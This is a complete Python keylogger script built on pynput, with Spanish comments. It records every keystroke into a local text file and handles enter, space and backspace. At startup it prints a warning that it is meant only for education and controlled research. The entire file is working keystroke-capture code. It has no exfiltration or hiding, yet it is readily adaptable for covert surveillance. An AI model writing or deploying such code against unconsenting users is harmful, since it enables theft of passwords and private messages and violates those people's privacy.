from pathlib import Path

from pynput import keyboard

LOG_PATH = Path("output/keylogger_output.txt")

def on_press(key):
    try:
        if isinstance(key, keyboard.KeyCode):
            log(f"{key.char}")
        elif isinstance(key, keyboard.Key):
            if key == keyboard.Key.enter:
                log("\n")
            elif key == keyboard.Key.space:
                log(" ")
            elif key == keyboard.Key.backspace:
                unlog()
        else:
            log(f"{key}")
    except AttributeError:
        log(f"[{key}]")

def log(key):
    with LOG_PATH.open("a", encoding="utf-8") as f:
        f.write(key)

def unlog():
    with LOG_PATH.open("r+", encoding="utf-8") as f:
        contenido = f.read()
        if contenido:
            f.seek(0)
            f.write(contenido[:-1])  # quitar último carácter (no byte)
            f.truncate()

def reset_log_file():
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    LOG_PATH.write_text("", encoding="utf-8")


def main():
    print("ADVERTENCIA:\nEste programa se proporciona exclusivamente con fines educativos y de investigación en entornos controlados.\nSu uso en sistemas, cuentas o dispositivos sin autorización explícita puede ser ilegal y vulnerar la privacidad.\nEl autor no se hace responsable del uso indebido de este código.")
    reset_log_file()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
